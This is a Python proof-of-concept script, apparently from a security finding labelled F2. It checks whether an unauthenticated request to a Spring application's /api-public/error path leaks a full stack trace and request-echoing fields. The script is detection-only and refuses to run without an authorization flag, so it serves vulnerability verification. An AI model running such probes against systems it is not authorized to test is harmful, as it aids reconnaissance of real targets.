#!/usr/bin/env python3
"""F2 PoC — unauthenticated full stack-trace disclosure on /api-public/error.

Detection-only: fetches the framework's own 404 handler output once and checks
that the RFC 7807 body carries a multi-frame `trace` array plus request-echoing
properties. No exception is induced in the target; nothing is written.
Exits non-zero if the claimed disclosure is absent.
"""
import argparse
import json
import sys
import urllib.request
import urllib.error


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--main-base", required=True, help="e.g. http://127.0.0.1:18080")
    ap.add_argument("--confirm-authorised", action="store_true",
                    help="acknowledge the target is a lab you are authorized to test")
    args = ap.parse_args()
    if not args.confirm_authorised:
        print("refusing to run: pass --confirm-authorised to acknowledge lab authorization", file=sys.stderr)
        return 2

    url = args.main_base + "/api-public/error"
    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    op = urllib.request.build_opener(_NoRedirect, urllib.request.ProxyHandler({}))
    req = urllib.request.Request(url)
    try:
        with op.open(req, timeout=15) as r:
            st, body = r.status, r.read()
    except urllib.error.HTTPError as e:
        st, body = e.code, e.read()

    print(f"GET {url} (no cookie) -> {st}, {len(body)} bytes")
    if st not in (200, 404):
        print("FAIL: expected 200/404 from the public error path", file=sys.stderr)
        return 1
    try:
        doc = json.loads(body)
    except json.JSONDecodeError:
        print("FAIL: body is not JSON", file=sys.stderr)
        return 1

    trace = doc.get("trace") or []
    frames = [t for t in trace if isinstance(t, str) and t.strip()]
    has_internal = any("org.springframework" in f for f in frames)
    echo = ("parameters" in doc) and ("hostname" in doc)

    print(f"trace frames: {len(frames)} (expect > 20), "
          f"internal spring frames present: {has_internal}, "
          f"request-echo properties (parameters/hostname): {echo}")
    if len(frames) <= 20 or not has_internal or not echo:
        print("FAIL: claimed disclosure not observed", file=sys.stderr)
        return 1

    print("OK: unauthenticated stack-trace disclosure reproduced "
          "(single GET, no exception induced in the target)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
